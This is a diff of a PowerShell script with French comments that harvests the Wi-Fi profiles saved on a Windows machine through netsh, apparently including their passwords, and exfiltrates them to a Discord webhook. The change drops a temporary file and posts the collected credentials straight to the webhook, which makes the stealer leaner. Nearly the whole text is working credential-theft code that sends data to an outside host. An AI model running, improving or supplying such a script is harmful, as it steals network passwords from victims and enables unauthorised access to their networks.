@@ -7,32 +7,21 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-O
     }
 }
 
-# Afficher les informations Wi-Fi récupérées
-Write-Host "Informations Wi-Fi récupérées :"
-Write-Host $wifiProfiles
-
-# Écriture des informations dans un fichier texte
-$wifiProfiles | Out-File -FilePath $env:TEMP/--wifi-pass.txt
-
-# Vérification du contenu du fichier texte
-Write-Host "Contenu du fichier texte :"
-Get-Content $env:TEMP/--wifi-pass.txt
-
-# Envoi du fichier à Discord
+# Envoi des informations à Discord
 function Upload-Discord {
     param (
-        [string]$file,
-        [string]$webhook
+        [string]$webhook,
+        [string]$message
     )
 
     $Body = @{
-      'username' = $env:username
-      'content' = Get-Content -Path $file -Raw
+      'content' = $message
     }
 
     Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhook -Method Post -Body ($Body | ConvertTo-Json)
 }
 
+# Envoi des informations à Discord
 if (-not ([string]::IsNullOrEmpty($dc))){
-    Upload-Discord -file "$env:TEMP/--wifi-pass.txt" -webhook $dc
+    Upload-Discord -webhook $dc -message ($wifiProfiles -join "`n")
 }
